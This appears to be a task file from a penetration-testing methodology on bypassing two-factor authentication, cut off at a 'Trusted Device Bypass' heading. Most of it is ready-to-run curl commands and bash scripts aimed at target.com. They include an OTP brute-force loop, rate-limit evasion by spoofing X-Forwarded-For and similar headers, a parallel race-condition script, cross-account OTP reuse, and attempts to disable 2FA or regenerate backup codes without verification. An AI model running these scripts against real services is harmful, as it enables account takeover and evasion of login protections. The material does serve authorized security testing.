================================================================================
TASK 65 Â· 2FA/MFA BYPASS SUITE
================================================================================
Covers testing_toolkit.txt Phase 7 Step 24
Complete two-factor authentication bypass methodology.

OBJECTIVE:
- Bypass TOTP, SMS, Email-based 2FA
- Brute-force backup codes with rate-limit bypass
- Exploit response manipulation vulnerabilities
- Test token reuse and timing attacks
- Identify 2FA enrollment/removal weaknesses

================================================================================
INPUTS
================================================================================
outputs/har/accounts/*_auth.json          â† Auth tokens from HAR (per-account)
outputs/har/common_data.txt               â† 2FA-related endpoints from HAR
outputs/live_base_urls.txt                â† Target hosts
outputs/url_corpus_all_in_scope.txt       â† URL corpus (grep for login/2fa/mfa paths)

================================================================================
OUTPUTS
================================================================================
outputs/2fa_bypass/
â”œâ”€â”€ 2fa_mechanisms.txt             â† Identified 2FA methods
â”œâ”€â”€ bypass_results.txt             â† Successful bypasses
â”œâ”€â”€ rate_limit_bypass.txt          â† Rate limit evasion results
â”œâ”€â”€ response_manipulation.txt      â† Response tampering findings
â”œâ”€â”€ backup_code_attack.txt         â† Backup code brute-force results
â””â”€â”€ scan_log.txt                   â† Full execution log

================================================================================
ğŸ§  2FA FUNDAMENTALS - UNDERSTAND BEFORE ATTACKING ğŸ§ 
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2FA Methods (Common)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Method          â”‚ Description                  â”‚ Attack Surface            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ TOTP            â”‚ Time-based OTP (Google Auth) â”‚ Timing, brute-force       â”‚
â”‚ SMS OTP         â”‚ Code via SMS                 â”‚ SIM swap, brute-force     â”‚
â”‚ Email OTP       â”‚ Code via email               â”‚ Email takeover, brute     â”‚
â”‚ Push            â”‚ Approve/deny on device       â”‚ Fatigue attacks           â”‚
â”‚ Hardware Key    â”‚ FIDO2/U2F                    â”‚ Limited attack surface    â”‚
â”‚ Backup Codes    â”‚ One-time recovery codes      â”‚ Brute-force, predictable  â”‚
â”‚ Security Qs     â”‚ Knowledge-based              â”‚ OSINT, brute-force        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2FA Flow (Typical)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. User enters username/password â†’ SUCCESS
2. Server sets temporary state (not fully authenticated)
3. Server sends/generates 2FA code
4. User enters 2FA code
5. Server validates â†’ Full authentication granted

ATTACK OPPORTUNITIES:
- Skip step 2-4 entirely
- Bypass rate limits on step 4
- Manipulate response in step 5
- Reuse code from step 3
- Attack backup/recovery paths

================================================================================
PHASE 1: 2FA MECHANISM DISCOVERY
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 Identify 2FA Endpoints
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Common 2FA endpoint patterns
/verify
/mfa
/2fa
/two-factor
/otp
/totp
/challenge
/auth/step2
/login/verify
/api/auth/mfa
/api/verify-otp
/api/validate-code

# From HAR files
grep -rPi '2fa|mfa|otp|totp|verify|challenge' outputs/har_*

# Enumerate endpoints
for endpoint in verify mfa 2fa otp totp challenge; do
    curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
        "https://target.com/${endpoint}"
    curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
        "https://target.com/api/${endpoint}"
done

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 Identify 2FA Type
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Check settings/security page for 2FA options
curl -s -b session.txt "https://target.com/settings/security" | \
    grep -iPo '(totp|authenticator|sms|email|backup|recovery|u2f|webauthn)'

# Look for JavaScript references
grep -rPi 'totp|otpauth|authenticator' temp/agent1/js_responses/

# Check for QR code endpoints (TOTP setup)
curl -s -b session.txt "https://target.com/settings/2fa/setup"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.3 Map 2FA Parameters
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Common parameter names
code
otp
token
totp
mfa_code
verification_code
auth_code
pin
2fa_code
backup_code
recovery_code

# Capture 2FA request format
curl -s -X POST "https://target.com/verify" \
    -d "code=123456" \
    -c cookies.txt -b cookies.txt \
    -D response_headers.txt

================================================================================
PHASE 2: DIRECT 2FA BYPASS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Skip 2FA Step Entirely
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# After password auth, try accessing protected pages directly

# Step 1: Login with valid creds (stops at 2FA)
curl -s -c session.txt -X POST "https://target.com/login" \
    -d "username=user&password=pass"

# Step 2: Skip 2FA, access protected resource
curl -s -b session.txt "https://target.com/dashboard"
curl -s -b session.txt "https://target.com/api/me"
curl -s -b session.txt "https://target.com/account/settings"

# If access granted â†’ 2FA completely bypassable!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 Null/Empty Code Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test with empty, null, or zero values

curl -s -b session.txt -X POST "https://target.com/verify" -d "code="
curl -s -b session.txt -X POST "https://target.com/verify" -d "code=null"
curl -s -b session.txt -X POST "https://target.com/verify" -d "code=0"
curl -s -b session.txt -X POST "https://target.com/verify" -d "code=000000"
curl -s -b session.txt -X POST "https://target.com/verify" -d ""
curl -s -b session.txt -X POST "https://target.com/verify"

# JSON format
curl -s -b session.txt -X POST "https://target.com/api/verify" \
    -H "Content-Type: application/json" \
    -d '{"code":null}'

curl -s -b session.txt -X POST "https://target.com/api/verify" \
    -H "Content-Type: application/json" \
    -d '{"code":""}'

curl -s -b session.txt -X POST "https://target.com/api/verify" \
    -H "Content-Type: application/json" \
    -d '{}'

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 Parameter Manipulation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Remove 2FA parameter entirely
curl -s -b session.txt -X POST "https://target.com/verify" \
    -d "other_param=value"

# Add success indicator
curl -s -b session.txt -X POST "https://target.com/verify" \
    -d "code=123456&verified=true"

curl -s -b session.txt -X POST "https://target.com/verify" \
    -d "code=123456&success=1"

curl -s -b session.txt -X POST "https://target.com/verify" \
    -d "code=123456&skip=1"

# Change HTTP method
curl -s -b session.txt "https://target.com/verify?code=123456"
curl -s -b session.txt -X PUT "https://target.com/verify" -d "code=123456"
curl -s -b session.txt -X DELETE "https://target.com/verify"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.4 Direct Access to Post-2FA Endpoints
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# After login (pre-2FA), try different endpoints

# API endpoints may not enforce 2FA
curl -s -b session.txt "https://target.com/api/v1/user"
curl -s -b session.txt "https://target.com/api/v2/profile"
curl -s -b session.txt "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{me{id email}}"}'

# Mobile API endpoints
curl -s -b session.txt "https://target.com/mobile/api/user"
curl -s -b session.txt -H "X-Mobile-App: true" "https://target.com/api/user"

# Legacy endpoints
curl -s -b session.txt "https://target.com/v1/dashboard"
curl -s -b session.txt "https://target.com/old/account"

================================================================================
PHASE 3: RESPONSE MANIPULATION
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 Understanding Response Manipulation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
CONCEPT: Client trusts server response without proper validation
- Server returns {"success": false, "error": "Invalid code"}
- Attacker intercepts and changes to {"success": true}
- Client processes modified response as successful

REQUIRES: Client-side logic that trusts response data

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 Identify Response Format
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Capture actual response to wrong code
curl -s -b session.txt -X POST "https://target.com/verify" \
    -d "code=000000" | jq .

# Common response patterns:
# {"success": false, "error": "Invalid code"}
# {"status": "error", "message": "Wrong OTP"}
# {"verified": false}
# {"code": 401, "valid": false}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.3 Test Client-Side Trust
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If you control a proxy (mitmproxy), modify responses
# This tests if client-side JavaScript trusts the response

# Example mitmproxy script to modify response:
# def response(flow):
#     if "verify" in flow.request.url:
#         flow.response.text = '{"success": true}'

# For CLI testing, you need to:
# 1. Understand what client does after receiving response
# 2. Manually check if modified response grants access

# Check JavaScript for response handling
grep -rP 'success|verified|authenticated' temp/agent1/js_responses/ | head -50

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.4 Status Code Manipulation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Some clients only check HTTP status code

# If wrong code returns 401/403, test if 200 grants access
# This requires proxy interception to modify status code

# Check if app handles different status codes
curl -s -o /dev/null -w "%{http_code}" -b session.txt \
    -X POST "https://target.com/verify" -d "code=123456"

================================================================================
PHASE 4: BRUTE-FORCE ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 TOTP/OTP Brute-Force
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# TOTP is 6 digits = 1,000,000 combinations
# With 30-second window, need ~33k attempts/second (usually not feasible)

# But check for:
# - Extended validity window
# - No rate limiting
# - Multiple valid codes accepted

#!/bin/bash
# brute_6digit.sh - Test OTP brute-force

TARGET="$1"
SESSION_COOKIE="$2"
START=${3:-0}
END=${4:-999999}

for code in $(seq -w $START $END); do
    response=$(curl -s -b "$SESSION_COOKIE" \
        -X POST "$TARGET" \
        -d "code=$code")
    
    if echo "$response" | grep -qi "success\|welcome\|dashboard"; then
        echo "[!] VALID CODE: $code"
        break
    fi
    
    # Check for rate limiting
    if echo "$response" | grep -qi "rate\|limit\|locked\|too many"; then
        echo "[-] Rate limited at code: $code"
        break
    fi
done

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 SMS OTP Brute-Force
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# SMS OTP usually 4-6 digits
# 4 digits = 10,000 combinations
# 6 digits = 1,000,000 combinations

# Test for rate limiting first
for i in {1..20}; do
    curl -s -b session.txt -X POST "https://target.com/verify" \
        -d "code=000000" > /dev/null
    echo "Attempt $i"
done

# Check if locked out

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.3 Backup Code Brute-Force
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Backup codes are often 8-10 alphanumeric
# But some apps use simple patterns

# Common backup code formats:
# - 8 digits: 00000000 - 99999999
# - 8 hex: 00000000 - FFFFFFFF
# - Format: XXXX-XXXX (easier to brute)

# Check if backup codes endpoint has weaker rate limits
curl -s -b session.txt -X POST "https://target.com/verify/backup" \
    -d "code=12345678"

# Some apps allow multiple backup code attempts without lockout
# (separate from main OTP rate limit)

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.4 Rate Limit Bypass Techniques
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# rate_limit_bypass_2fa.sh

TARGET="$1"
SESSION="$2"

# Technique 1: IP rotation via headers
HEADERS=(
    "X-Forwarded-For"
    "X-Real-IP"
    "X-Originating-IP"
    "X-Remote-IP"
    "X-Client-IP"
    "X-Remote-Addr"
    "True-Client-IP"
    "CF-Connecting-IP"
)

for i in {1..100}; do
    IP="10.0.0.$i"
    for header in "${HEADERS[@]}"; do
        curl -s -b "$SESSION" -X POST "$TARGET" \
            -H "$header: $IP" \
            -d "code=$((RANDOM % 1000000))" > /dev/null
    done
done

# Technique 2: User-Agent rotation
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) Safari/605"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604"
    "Mozilla/5.0 (Linux; Android 14) Chrome/120"
)

for ua in "${USER_AGENTS[@]}"; do
    for code in $(seq 100000 100100); do
        curl -s -b "$SESSION" -X POST "$TARGET" \
            -A "$ua" \
            -d "code=$code" > /dev/null
    done
done

# Technique 3: Case variation on username
# If rate limit is per-user, try case variations
# user@email.com, USER@email.com, User@email.com

# Technique 4: Add spaces/null bytes
# username%00, username%20, username+

# Technique 5: Different endpoints
curl -s -X POST "https://target.com/verify" -d "code=123456"
curl -s -X POST "https://target.com/api/verify" -d "code=123456"
curl -s -X POST "https://target.com/api/v1/verify" -d "code=123456"
curl -s -X POST "https://target.com/api/v2/verify" -d "code=123456"

================================================================================
PHASE 5: TOKEN REUSE & TIMING ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 OTP Reuse Attack
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test if same OTP can be used multiple times

# Step 1: Get valid OTP (from test account you control)
VALID_OTP="123456"

# Step 2: Use OTP successfully
curl -s -b session1.txt -X POST "https://target.com/verify" \
    -d "code=$VALID_OTP"

# Step 3: Try using same OTP again
curl -s -b session2.txt -X POST "https://target.com/verify" \
    -d "code=$VALID_OTP"

# If works â†’ OTP not invalidated after use!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 Old OTP Acceptance
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test if previously generated OTPs still work

# TOTP has 30-second window, but some apps accept:
# - Previous window (30 seconds ago)
# - Multiple previous windows (clock skew tolerance)
# - Very old codes (broken implementation)

# If you have test account, generate OTP and wait
# Then test if old OTPs are accepted

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.3 Cross-Account OTP
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test if OTP from Account A works for Account B

# Step 1: Generate OTP for attacker account
# Step 2: Start login for victim account
# Step 3: Use attacker's OTP for victim's 2FA

curl -s -c session.txt -X POST "https://target.com/login" \
    -d "username=victim&password=victimpass"

curl -s -b session.txt -X POST "https://target.com/verify" \
    -d "code=$ATTACKER_OTP"

# If works â†’ OTP not bound to specific user/session!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.4 TOTP Timing Attack
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# TOTP changes every 30 seconds
# Test boundary conditions

# Get current TOTP time window
CURRENT_TIME=$(date +%s)
WINDOW=$((CURRENT_TIME / 30))

# Test right at window boundary
# Some apps accept codes from adjacent windows

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.5 Race Condition on OTP Validation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Send multiple requests simultaneously with same OTP
# May bypass "single use" check

#!/bin/bash
# race_otp.sh

TARGET="$1"
SESSION="$2"
OTP="$3"

for i in {1..50}; do
    curl -s -b "$SESSION" -X POST "$TARGET" -d "code=$OTP" &
done
wait

# Check if multiple sessions were authenticated

================================================================================
PHASE 6: 2FA ENROLLMENT/REMOVAL BYPASS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.1 Disable 2FA Without Verification
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Check if 2FA can be disabled without current 2FA code

curl -s -b session.txt -X POST "https://target.com/settings/2fa/disable"
curl -s -b session.txt -X DELETE "https://target.com/api/2fa"
curl -s -b session.txt -X POST "https://target.com/settings/security" \
    -d "2fa_enabled=false"

# Check if password alone is sufficient (no 2FA code required)
curl -s -b session.txt -X POST "https://target.com/settings/2fa/disable" \
    -d "password=currentpassword"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.2 Backup Codes Regeneration
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Can backup codes be regenerated without 2FA?

curl -s -b session.txt "https://target.com/settings/2fa/backup-codes/new"
curl -s -b session.txt -X POST "https://target.com/api/2fa/backup-codes/regenerate"

# If new backup codes generated without verifying current 2FA:
# Attacker with session can generate new codes â†’ bypass 2FA

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.3 2FA Setup Flow Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test if 2FA setup can be aborted, leaving account in weak state

# Start 2FA setup
curl -s -b session.txt "https://target.com/settings/2fa/setup"

# Don't complete, access protected resources
curl -s -b session.txt "https://target.com/dashboard"

# Check if 2FA is actually enforced

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.4 TOTP Secret Leakage
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Check if TOTP secret is exposed in responses

curl -s -b session.txt "https://target.com/settings/2fa" | grep -i "secret\|key"
curl -s -b session.txt "https://target.com/api/2fa/setup" | jq .

# Look for otpauth:// URI (contains secret)
# otpauth://totp/App:user@email?secret=BASE32SECRET&issuer=App

# Check QR code endpoint for direct secret exposure
curl -s -b session.txt "https://target.com/settings/2fa/qr"

================================================================================
PHASE 7: BACKUP/RECOVERY PATH ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.1 Security Questions Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If security questions are 2FA alternative

# Test for OSINT-able answers
# Common questions: mother's maiden name, first pet, high school

# Test for case-insensitive answers
curl -s -X POST "https://target.com/verify/security-question" \
    -d "answer=smith"
curl -s -X POST "https://target.com/verify/security-question" \
    -d "answer=SMITH"
curl -s -X POST "https://target.com/verify/security-question" \
    -d "answer=Smith"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.2 Email/SMS Recovery Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# "Send code to backup email/phone" flow

# Test if recovery skips 2FA entirely
curl -s -X POST "https://target.com/login/recover" \
    -d "email=user@target.com"

# Test for email/phone enumeration
curl -s -X POST "https://target.com/login/recover" \
    -d "email=nonexistent@target.com"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.3 Support Flow Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Social engineering angle - but also test:

# "Lost access to 2FA" flow
curl -s "https://target.com/support/2fa-recovery"
curl -s -X POST "https://target.com/api/support/disable-2fa" \
    -d "reason=lost_phone"

# Check if identity verification is weak

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.4 Trusted Device Bypass
